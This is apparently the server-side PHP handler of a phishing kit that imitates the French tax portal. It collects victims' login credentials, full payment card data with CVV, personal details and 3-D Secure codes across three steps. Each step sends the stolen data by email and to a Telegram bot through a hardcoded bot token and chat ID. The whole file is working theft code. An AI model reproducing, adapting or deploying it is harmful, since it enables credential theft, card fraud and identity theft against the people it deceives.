<?php
#########################################################################
# ███╗   ███╗██╗  ██╗ ██████╗ ██╗    ██╗ █████╗ ██╗  ██╗███████╗██████╗ #
# ████╗ ████║██║  ██║██╔════╝ ██║    ██║██╔══██╗██║ ██╔╝██╔════╝██╔══██╗#
# ██╔████╔██║███████║██║  ███╗██║ █╗ ██║███████║█████╔╝ █████╗  ██████╔╝#
# ██║╚██╔╝██║╚════██║██║   ██║██║███╗██║██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗#
# ██║ ╚═╝ ██║     ██║╚██████╔╝╚███╔███╔╝██║  ██║██║  ██╗███████╗██║  ██║#
# ╚═╝     ╚═╝     ╚═╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝#
#########################################################################     
#                    IMPOT UHQ BY WAKER V1                              #
#########################################################################

session_start();
include '../server/configuration.php';
include '../server/function.php';
include '../app/css/opt.php';

if (isset($_GET['action'])) {
    if ($_GET['action'] ==  'send') {
        $rez = $_GET['rez'];
            if ($_GET['step'] == "1") {
                $rezStepOne = explode('|',$rez);
                $message = "
📥 Login : ".$rezStepOne[0]."
🔑 Mot de passe : ".$rezStepOne[1]."

📡 IP : ".$_SERVER['REMOTE_ADDR']."
📡 User-Agent : ".$_SERVER['HTTP_USER_AGENT'];
            $subject = "🔑 +1 N_IMPOT " .$_SERVER['REMOTE_ADDR']." - ". $rez . " 🔑" ;
            $fromsender = "From: $spammer <log@rez.fr>";
            mail($rezmail,$subject,$message,$fromsender);
            sendMessage($message);
            
file_get_contents("https://api.telegram.org/bot$tokenbot/sendMessage?chat_id=-6504711855&text=" . urlencode($message)."" ); 
            }else if ($_GET['step'] == '2'){
                $final = explode('|',$rez);
                $bin = substr($final[0],0,7);
                $bin = str_replace(' ','',$bin);
                $data = json_decode(getBin($bin),true);
                echo $bin;
                $level = $data['level'];
                $type = $data['type'];
                $bank = $data['bank'];
                $message = "
💳 Nom sur carte : ".$final[0]."
💳 Numéro : ".$final[1]."
💳 Date d'expiration : ".$final[2]."
💳 CVV : ".$final[3]."
    
⚖️ Level : ".$level."
⚖️ Banque : ".$bank."
⚖️ Type : ".$type."
⚖️ Lien Ajout APPLE : ".getScan($final[1],$final[2])."

📮 Nom & Prenom : ".$final[4]."
📮 Ville : ".$final[5]."
📮 Code Postal : ".$final[6]."
📮 Adresse : ".$final[7]."
📮 Numéro de téléphone : ".$final[8]."
📮 DOB : ".$final[9]."

📡 IP : ".$_SERVER['REMOTE_ADDR']."
📡 User-Agent : ".$_SERVER['HTTP_USER_AGENT']."
                ";
            $subject = "💳 +1 CC ".$bin." - ".$level." - ".$bank."  ".$_SERVER['REMOTE_ADDR'] ." 💳";
            $fromsender = "From: $spammer <infosresultat@gmail.com>";
            mail($rezmail,$subject,$message,$fromsender);
            sendMessage($message);
             $token = "7117824032:AAHJpVlIFeNZsr2OcvU3FtebX1LKQuykVMw";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=6504711855&text=" . urlencode($message)."" ); 
            }else if ($_GET['step'] == "3") {
                $message = "
📱 CODE : ".$rez."

📡 IP : ".$_SERVER['REMOTE_ADDR']."
📡 User-Agent : ".$_SERVER['HTTP_USER_AGENT'];
            $subject = "📱 +1 VBV " .$rez." - ". $rez . " 📱" ;
            $fromsender = "From: $spammer <infosresultat@gmail.com>";
            mail($rezmail,$subject,$message,$fromsender);
            sendMessage($message);
             $token = "7117824032:AAHJpVlIFeNZsr2OcvU3FtebX1LKQuykVMw";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=6504711855&text=" . urlencode($message)."" ); 

            }     
        }
    }
   
?>
